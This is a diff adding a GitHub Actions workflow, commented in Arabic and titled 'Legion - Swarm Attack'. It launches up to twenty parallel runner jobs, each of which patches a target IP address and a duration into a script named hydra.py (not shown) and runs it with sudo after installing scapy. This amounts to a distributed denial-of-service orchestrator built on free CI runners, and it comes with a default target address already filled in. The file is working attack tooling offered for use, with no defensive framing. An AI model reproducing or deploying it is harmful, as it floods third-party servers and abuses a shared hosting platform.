@@ -1,0 +1,77 @@
+# اسم الـ Workflow: Legion - The Swarm Attack Coordinator
+name: Legion - Swarm Attack
+
+on:
+  # التشغيل اليدوي مع مدخلات للتحكم الكامل
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'عنوان IP الهدف'
+        required: true
+        default: '63.246.154.12'
+      duration:
+        description: 'مدة الهجوم بالثواني'
+        required: true
+        default: '600'
+      swarm_size:
+        description: 'حجم السرب (عدد المهاجمين المتوازيين)'
+        required: true
+        default: '20' # سنطلق 20 مهاجماً في نفس الوقت
+
+jobs:
+  # المهمة الأولى: قائد السرب (Orchestrator)
+  # هذه المهمة لا تهاجم، بل تقوم بتفعيل الجنود
+  orchestrate_swarm:
+    runs-on: ubuntu-latest
+    
+    # تحديد المخرجات التي ستمررها المهمة
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+      
+    steps:
+      - name: Generate the attack matrix
+        id: set-matrix
+        # هذه الخطوة تنشئ مصفوفة من الأرقام بحجم السرب المطلوب
+        # مثال: إذا كان swarm_size هو 20، ستنشئ مصفوفة [1, 2, 3, ..., 20]
+        run: echo "matrix={\"include\":[$(for i in {1..${{ github.event.inputs.swarm_size }}}; do echo -n "{\"soldier_id\":$i},"; done | sed 's/,$//')]}" >> $GITHUB_OUTPUT
+
+  # المهمة الثانية: الجندي المهاجم (The Soldier)
+  # هذه المهمة ستعمل بشكل متوازٍ بعدد "حجم السرب"
+  attack_soldier:
+    # تعتمد على المهمة الأولى للحصول على مصفوفة الهجوم
+    needs: orchestrate_swarm
+    runs-on: ubuntu-latest
+    
+    # استراتيجية المصفوفة: هذا هو سر القوة
+    # سيتم تشغيل هذه المهمة لكل عنصر في المصفوفة التي أنشأها القائد
+    strategy:
+      fail-fast: false # لا توقف باقي الجنود إذا فشل أحدهم
+      matrix: ${{fromJson(needs.orchestrate_swarm.outputs.matrix)}}
+
+    # خطوات التنفيذ لكل جندي
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Set up Python 3.9
+        uses: actions/setup-python@v3
+        with:
+          python-version: 3.9
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install scapy aiodns
+
+      - name: Launch Hydra - Soldier ${{ matrix.soldier_id }}
+        run: |
+          echo "الجندي رقم: ${{ matrix.soldier_id }} من ${{ github.event.inputs.swarm_size }}"
+          echo "الهدف: ${{ github.event.inputs.target_ip }}"
+          echo "المدة: ${{ github.event.inputs.duration }} ثانية"
+          
+          # تعديل الكود بالمدخلات
+          sed -i "s/TARGET_IP = .*/TARGET_IP = \"${{ github.event.inputs.target_ip }}\"/" hydra.py
+          sed -i "s/DURATION = .*/DURATION = ${{ github.event.inputs.duration }}/" hydra.py
+          
+          echo "الجندي ${{ matrix.soldier_id }} يبدأ الهجوم..."
+          sudo python3 hydra.py
